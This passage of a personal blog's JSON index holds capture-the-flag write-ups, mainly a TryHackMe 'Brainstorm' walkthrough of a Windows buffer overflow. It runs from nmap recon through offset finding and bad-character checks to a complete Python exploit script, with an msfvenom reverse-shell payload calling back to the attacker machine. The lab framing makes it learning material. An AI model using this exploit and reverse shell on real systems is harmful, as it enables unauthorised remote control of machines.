style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003estrncat\u003c/span\u003e(command, message, \u003cspan style=\"color:#ae81ff\"\u003e98\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003estrncat\u003c/span\u003e(command, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esystem\u003c/span\u003e(command);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIt has been a while since I have done any CTFs! So I struggled a little bit looking at the code and what they do.\u003c/p\u003e\n\u003cp\u003eWhen I pass 109 A\u0026rsquo;s, it still runs the \u003ca href=\"https://en.wikipedia.org/wiki/Cowsay\"\u003ecowsay\u003c/a\u003e bin.\u003c/p\u003e\n\u003cp\u003eWhen you pass in 113 A\u0026rsquo;s, the output starts to show a single \u0026lsquo;A\u0026rsquo;:\u003c/p\u003e","title":"BuckeyeCTF 2024 - Binary Exploitation"},{"content":"Challenge: Brainstorm This is a room that tests on reverse engineering a chat program to exploit a Windows machine.\nRecon Nmap:\n─$ nmap -sC -sV -Pn 10.10.37.33 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 00:02 EDT Nmap scan report for hi-hormel-wg010.hi.umn.edu (10.10.37.33) Host is up (0.22s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: TIMEOUT | ftp-syst: |_ SYST: Windows_NT 3389/tcp open ssl/ms-wbt-server? | rdp-ntlm-info: | Target_Name: BRAINSTORM | NetBIOS_Domain_Name: BRAINSTORM | NetBIOS_Computer_Name: BRAINSTORM | DNS_Domain_Name: brainstorm | DNS_Computer_Name: brainstorm | Product_Version: 6.1.7601 |_ System_Time: 2023-09-22T04:05:48+00:00 | ssl-cert: Subject: commonName=brainstorm | Not valid before: 2023-09-21T03:52:41 |_Not valid after: 2024-03-22T03:52:41 |_ssl-date: 2023-09-22T04:06:19+00:00; +1s from scanner time. 9999/tcp open abyss? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 216.80 seconds First thing I noticed was Port 21 ftp was open with the anonymous FTP login enabled. I checked it out by running ftp 10.10.37.33 with the name anonymous.\nWhen I tried to ls the ftp server, it prompted 229 Entering Extended Passive Mode (|||49178|). Simply you need to type passiveto turn the passive mode off. After that, I was able to spot the chatserver directory. Moving into the directory, there were two files chatserver.exe and essfunc.dll. I learned that when you download a binary from a ftp server, you would want to turn on the binary option to make sure the files do not get corrupted while being transferred. I ran binary and prompt OFF (to turn off the prompt asking yes or no) then ran mget * to download all the files.\nTo move files between the guest VMs in VirtualBox, I used File Manager functionality which allows you to move files between the host and the guest\nlink. I prepared two VMs: Kali, Windows and set up the networking between them. I followed this write-up - https://www.makeuseof.com/how-network-two-virtual-machines-with-virtualbox/\nReverse engineering a Windows binary For this task, the write-up suggests the Immunity Debugger and Mona python script. In short, buffer overflow is a way to control the flow of code execution by overwriting the EIP register which stores the memory address of the next instruction to be executed. If we are able to overwrite this register with the memory address of our choice, we can do many interesting things!\nAfter installing the immunity debugger and loading the chatserver executable, you will see something like this:\nWhen trying to exploit a buffer overflow vulnerability, one would try to input a bunch of bytes to see if we can break the program. So what I did was to create a cyclic pattern of 5000 bytes and sent it to the chatserver program. I used pwntools which is a CTF framework written in Python - it has a lot of useful tools (you can install it through pip). To create 5000 bytes of cyclic pattern, pwn cyclic 5000. The I copied and pasted the cyclic pattern and passed them as the input message for the program. The program crashed and the immunity debugger showed this:\nAs we can see, the EIP register is now 75616164 (in hex) and we can use these four bytes to find the offset from the beginning of the input buffer to the beginning of the EIP register. That can be done by running pwn cyclic -l 0x75616164. This gave me 2012 meaning we would need some random 2012 bytes before actually overwriting the first byte of the EIP register. So, if we send 2012 bytes of something plus BBBB, the EIP should end up being 0x42424242.\nWe can automate the process by creating a python script that would do the job for us.\nimport socket import sys username = b\u0026#39;hello\u0026#39; payload = b\u0026#39;A\u0026#39; * 2012 + b\u0026#39;B\u0026#39; * 4 target_ip = \u0026#39;10.0.2.15\u0026#39; target_port = 9999 try: print(\u0026#34;Sending payload...\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target_ip, target_port)) s.recv(1024) s.recv(1024) s.send(username + b\u0026#39;\\r\\n\u0026#39;) # \u0026#39;\\r\\n\u0026#39; -\u0026gt; return + new line : hitting enter, a single \\n might do the job s.recv(1024) s.send(payload + b\u0026#39;\\r\\n\u0026#39;) s.recv(1024) s.close() except: print(\u0026#34;Cannot connect to the server\u0026#34;) Now this script should do the same thing as what we were doing in the terminal. The next step is to find the bad characters that might exist in the program. We need to find them to prevent any issues that could arise from our shellcode not working. For example, x00 is one of the bad characters, which is a null character - it terminates the byte stream.\nhttps://github.com/cytopia/badchars Useful resource for badchars After visiting the Github page, I modified the script above to send them with the payload.\nimport socket import sys username = b\u0026#39;hello\u0026#39; payload = b\u0026#39;A\u0026#39; * 2012 + b\u0026#39;B\u0026#39; * 4 target_ip = \u0026#39;10.0.2.15\u0026#39; target_port = 9999 badchars = ( b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; b\u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; b\u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; b\u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; b\u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; b\u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; b\u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; b\u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; b\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; b\u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; b\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; b\u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; b\u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; b\u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; b\u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; b\u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; ) try: print(\u0026#34;Sending payload...\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target_ip, target_port)) s.recv(1024) s.recv(1024) s.send(username + b\u0026#39;\\r\\n\u0026#39;) # \u0026#39;\\r\\n\u0026#39; -\u0026gt; return + new line : hitting enter, a single \\n might do the job s.recv(1024) s.send(payload + badchars + b\u0026#39;\\r\\n\u0026#39;) s.recv(1024) s.close() except: print(\u0026#34;Cannot connect to the server\u0026#34;) try: print(\u0026#34;Sending payload...\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target_ip, target_port)) s.recv(1024) s.recv(1024) s.send(username + b\u0026#39;\\r\\n\u0026#39;) # \u0026#39;\\r\\n\u0026#39; -\u0026gt; return + new line : hitting enter s.recv(1024) s.send(payload + shellcode + b\u0026#39;\\r\\n\u0026#39;) s.recv(1024) s.close() except: print(\u0026#34;Cannot connect to the server\u0026#34;) After running the script again (make sure you re-launch the program in the debugger), you can right-click the value of ESP register and click Follow in Dump. I was able to see the bad characters I sent along with the payload:\nWe can see the start of the badchars 01 02 03 ... 9E 0F A0. As I mentioned earlier, we can use mona with the debugger to make our lives a bit easier. I found this article and this that walk through how to use moan with the debugger.\nAccording to the second article, first we need to set the base directory for mona by running !mona config -set workingfolder C:\\monaand run !mona bytearray -cpb \\x00. This will generate files bytearray.txt and bytearray.bin in the base directory and we can use them to compare the current badchars sequence that we passed into the program.\nRunning this command !mona compare -a esp -f C:\\mona\\bytearray.bin will tell you if there are any bad characters. After running it, I got this result:\nSo, other than the null byte, we could use all the bytes to create a shellcode. The next thing we need to do is to check if there are any protection mechanisms in place. You can check it easily by running !monal modules. The result of the run looks like this:\nWhat we want to look at is the lines that have all False columns and there are two: chatserver.exe and essfunc.dll (the dll library we downloaded from the ftp server).\nI learned that, just like how we would try to find gadgets from ELF files in Linux, we need to find an instruction that allows us to jump to ESP so we can redirect the code flow to our shellcode. !mona find -s \u0026quot;\\xff\\xe4\u0026quot; -m essfunc.dll is the command we want to run: \\xff\\xe4 is the byte instruction for JMP ESP.\nThere were several JMP ESP instructions in the dll file. Let\u0026rsquo;s say I am going to use the address of 0x625014df. When we use this address in our script, this address needs to be entered in little-endian order. Now we need to create a shellcode.\nmsfvenom -p windows/shell_reverse_tcp LHOST=\u0026lt;kali_vm_ip\u0026gt; LPORT=\u0026lt;kali_vm_port\u0026gt; -b \u0026quot;\\x00\u0026quot; -f c\nThis is a shellcode written in C (-f c) and it specifies the bad character (-b \u0026quot;\\x00\u0026quot;). After copying and pasting the shellcode to the script file, it looks like this now:\nimport socket import sys username = b\u0026#39;hello\u0026#39; target_ip = \u0026#39;10.0.2.15\u0026#39; target_port = 9999 jmp_esp = b\u0026#39;\\xdf\\x14\\x50\\x62\u0026#39; payload = b\u0026#39;A\u0026#39; * 2012 + jmp_esp + b\u0026#34;\\x90\u0026#34; * 32 # adding a few nop instructions shellcode = (b\u0026#34;\\xdb\\xc1\\xbf\\x36\\x67\\xf6\\xf3\\xd9\\x74\\x24\\xf4\\x5a\\x31\\xc9\u0026#34; b\u0026#34;\\xb1\\x52\\x31\\x7a\\x17\\x03\\x7a\\x17\\x83\\xdc\\x9b\\x14\\x06\\xdc\u0026#34; b\u0026#34;\\x8c\\x5b\\xe9\\x1c\\x4d\\x3c\\x63\\xf9\\x7c\\x7c\\x17\\x8a\\x2f\\x4c\u0026#34; b\u0026#34;\\x53\\xde\\xc3\\x27\\x31\\xca\\x50\\x45\\x9e\\xfd\\xd1\\xe0\\xf8\\x30\u0026#34; b\u0026#34;\\xe1\\x59\\x38\\x53\\x61\\xa0\\x6d\\xb3\\x58\\x6b\\x60\\xb2\\x9d\\x96\u0026#34; b\u0026#34;\\x89\\xe6\\x76\\xdc\\x3c\\x16\\xf2\\xa8\\xfc\\x9d\\x48\\x3c\\x85\\x42\u0026#34; b\u0026#34;\\x18\\x3f\\xa4\\xd5\\x12\\x66\\x66\\xd4\\xf7\\x12\\x2f\\xce\\x14\\x1e\u0026#34; b\u0026#34;\\xf9\\x65\\xee\\xd4\\xf8\\xaf\\x3e\\x14\\x56\\x8e\\x8e\\xe7\\xa6\\xd7\u0026#34; b\u0026#34;\\x29\\x18\\xdd\\x21\\x4a\\xa5\\xe6\\xf6\\x30\\x71\\x62\\xec\\x93\\xf2\u0026#34; b\u0026#34;\\xd4\\xc8\\x22\\xd6\\x83\\x9b\\x29\\x93\\xc0\\xc3\\x2d\\x22\\x04\\x78\u0026#34; b\u0026#34;\\x49\\xaf\\xab\\xae\\xdb\\xeb\\x8f\\x6a\\x87\\xa8\\xae\\x2b\\x6d\\x1e\u0026#34; b\u0026#34;\\xce\\x2b\\xce\\xff\\x6a\\x20\\xe3\\x14\\x07\\x6b\\x6c\\xd8\\x2a\\x93\u0026#34; b\u0026#34;\\x6c\\x76\\x3c\\xe0\\x5e\\xd9\\x96\\x6e\\xd3\\x92\\x30\\x69\\x14\\x89\u0026#34; b\u0026#34;\\x85\\xe5\\xeb\\x32\\xf6\\x2c\\x28\\x66\\xa6\\x46\\x99\\x07\\x2d\\x96\u0026#34; b\u0026#34;\\x26\\xd2\\xe2\\xc6\\x88\\x8d\\x42\\xb6\\x68\\x7e\\x2b\\xdc\\x66\\xa1\u0026#34; b\u0026#34;\\x4b\\xdf\\xac\\xca\\xe6\\x1a\\x27\\xff\\xf6\\x26\\xb3\\x97\\xf4\\x26\u0026#34; b\u0026#34;\\xbf\\xb5\\x70\\xc0\\xd5\\x29\\xd5\\x5b\\x42\\xd3\\x7c\\x17\\xf3\\x1c\u0026#34; b\u0026#34;\\xab\\x52\\x33\\x96\\x58\\xa3\\xfa\\x5f\\x14\\xb7\\x6b\\x90\\x63\\xe5\u0026#34; b\u0026#34;\\x3a\\xaf\\x59\\x81\\xa1\\x22\\x06\\x51\\xaf\\x5e\\x91\\x06\\xf8\\x91\u0026#34; b\u0026#34;\\xe8\\xc2\\x14\\x8b\\x42\\xf0\\xe4\\x4d\\xac\\xb0\\x32\\xae\\x33\\x39\u0026#34; b\u0026#34;\\xb6\\x8a\\x17\\x29\\x0e\\x12\\x1c\\x1d\\xde\\x45\\xca\\xcb\\x98\\x3f\u0026#34; b\u0026#34;\\xbc\\xa5\\x72\\x93\\x16\\x21\\x02\\xdf\\xa8\\x37\\x0b\\x0a\\x5f\\xd7\u0026#34; b\u0026#34;\\xba\\xe3\\x26\\xe8\\x73\\x64\\xaf\\x91\\x69\\x14\\x50\\x48\\x2a\\x24\u0026#34; b\u0026#34;\\x1b\\xd0\\x1b\\xad\\xc2\\x81\\x19\\xb0\\xf4\\x7c\\x5d\\xcd\\x76\\x74\u0026#34; b\u0026#34;\\x1e\\x2a\\x66\\xfd\\x1b\\x76\\x20\\xee\\x51\\xe7\\xc5\\x10\\xc5\\x08\u0026#34; b\u0026#34;\\xcc\u0026#34;) try: print(\u0026#34;Sending payload...\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target_ip, target_port)) s.recv(1024) s.recv(1024) s.send(username + b\u0026#39;\\r\\n\u0026#39;) # \u0026#39;\\r\\n\u0026#39; -\u0026gt; return + new line : hitting enter s.recv(1024) s.send(payload + shellcode + b\u0026#39;\\r\\n\u0026#39;) s.recv(1024) s.close() except: print(\u0026#34;Cannot connect to the server\u0026#34;) When I ran the script without adding any nop instructions, it would not work. After adding a few bytes of nop instructions, I was able to create the reverse shell connection between the Kali VM and the Windows VM.\nNow it is time to test the script on the actual target of this challenge and the Kali VM\u0026rsquo;s IP address (the one that is connected to the THM\u0026rsquo;s VPN tunnel - tun0).\nAfter modifying the script, I was able to access the target machine.\nThings I learned from this room Allowing communication (networking) between Guest VMs The use of Immunity Debugger and Mona script ","permalink":"https://joonkim0625.github.io/posts/2023-9-23-thm-brainstorm/","summary":"\u003ch2 id=\"challenge-brainstorm\"\u003eChallenge: Brainstorm\u003c/h2\u003e\n\u003cp\u003eThis is a room that tests on reverse engineering a chat program to exploit a\nWindows machine.\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRecon\u003c/h2\u003e\n\u003cp\u003eNmap:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e─$\u003c/span\u003e nmap \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003esC \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003esV \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003ePn \u003cspan style=\"color:#ae81ff\"\u003e10.10.37.33\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStarting Nmap \u003cspan style=\"color:#ae81ff\"\u003e7.93\u003c/span\u003e ( https:\u003cspan style=\"color:#f92672\"\u003e//\u003c/span\u003enmap\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eorg ) at \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e09\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e00\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e02\u003c/span\u003e EDT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap scan report \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e hi\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003ehormel\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003ewg010\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehi\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eumn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eedu (\u003cspan style=\"color:#ae81ff\"\u003e10.10.37.33\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost \u003cspan style=\"color:#f92672\"\u003eis\u003c/span\u003e up (\u003cspan style=\"color:#ae81ff\"\u003e0.22\u003c/span\u003es latency)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNot shown: \u003cspan style=\"color:#ae81ff\"\u003e997\u003c/span\u003e filtered tcp ports (no\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eresponse)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT     STATE SERVICE            VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003etcp   open  ftp                Microsoft ftpd\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e ftp\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eanon: Anonymous FTP login allowed (FTP code \u003cspan style=\"color:#ae81ff\"\u003e230\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e_Can\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;t get directory listing: TIMEOUT\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e ftp\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003esyst:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e_  SYST: Windows_NT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e3389\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003etcp open  ssl\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003ems\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003ewbt\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003eserver\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e?\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e rdp\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003entlm\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003einfo:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e   Target_Name: BRAINSTORM\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: BRAINSTORM\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: BRAINSTORM\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e   DNS_Domain_Name: brainstorm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e   DNS_Computer_Name: brainstorm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e   Product_Version: \u003cspan style=\"color:#ae81ff\"\u003e6.1.7601\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e_  System_Time: \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e09\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003eT04:\u003cspan style=\"color:#ae81ff\"\u003e05\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e48\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e00\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e00\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e ssl\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003ecert: Subject: commonName\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebrainstorm\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e Not valid before: \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e09\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003eT03:\u003cspan style=\"color:#ae81ff\"\u003e52\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e41\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e_Not valid after:  \u003cspan style=\"color:#ae81ff\"\u003e2024\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e03\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003eT03:\u003cspan style=\"color:#ae81ff\"\u003e52\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e41\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e_ssl\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003edate: \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e09\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003eT04:\u003cspan style=\"color:#ae81ff\"\u003e06\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e19\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e00\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e00\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003es \u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e scanner time\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e9999\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003etcp open  abyss\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e?\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService Info: OS: Windows; CPE: cpe:\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003eo:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService detection performed\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e Please report any incorrect results at https:\u003cspan style=\"color:#f92672\"\u003e//\u003c/span\u003enmap\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eorg\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003esubmit\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap done: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e IP address (\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e host up) scanned \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e216.80\u003c/span\u003e seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eFirst thing I noticed was Port 21 \u003ccode\u003eftp\u003c/code\u003e was open with the anonymous FTP login\nenabled. I checked it out by running \u003ccode\u003eftp 10.10.37.33\u003c/code\u003e with the name\n\u003ccode\u003eanonymous\u003c/code\u003e.\u003c/p\u003e","title":"TryHackMe - Brainstorm"},{"content":"Challenge: Relevant Recon NMAP I was not able to find any clues from the initial Nmap scans and other tools that I used. So I looked up the official writeup, and the author suggests to run a scan that detects the open ports and then run more focused Nmap scan on them. He created a tool threader3000 and I decided to give it a try.\nThe result showed that port 80, 139, 135, 445, 3389, 5985, 49663, 49666, and 49668. And these 40,000s are commonly used for backend operations within virtual environments such as AWS.\nOnce his Python script finishes the port scanning, it suggests a nmap command to run. The result is:\nPORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: 